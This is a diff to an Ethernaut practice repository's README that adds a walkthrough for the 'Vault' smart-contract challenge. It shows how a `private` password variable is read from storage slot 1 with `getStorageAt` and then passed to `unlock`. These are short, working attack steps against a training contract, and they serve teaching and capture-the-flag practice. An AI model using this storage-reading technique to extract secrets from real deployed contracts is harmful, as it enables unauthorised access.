@@ -189,6 +189,32 @@ At first, this challenge seems confusing but as you dig a little bit deeper you 
     await contract.balance()
 ```
 
+## 08 - Vault
+
+For Reference -> [Challenge](./questions/08.Vault.sol) | [Solution](./answers/08.Vault.js)
+
+This challenge has to do with private Storages, thus it be better to get a understanding of it and you can also refer it through one of the [bonuses](./Bonus/PrivateStorages) section.
+
+Let's come to this challenge, first thing is - `private` doesn't mean your data is secure, it just means that it's not accessible through the contract's ABI. But, it can still be accessed by other contracts. Thus, we will be using `getStorageAt` function to get the value of the `password` variable.
+
+1. First initialize the address of our instance in a separate variable
+
+```javascript
+    var addr = 'your contract address'
+```
+
+2. Now we will get storage of slot1
+
+```javascript
+    await web3.eth.getStorageAt(addr, 1)
+```
+
+3. Copy that hexadecimal value you got from 2nd step, and pass it here!
+
+```javascript
+    await contract.unlock("your_hexadecimal_value")
+```
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
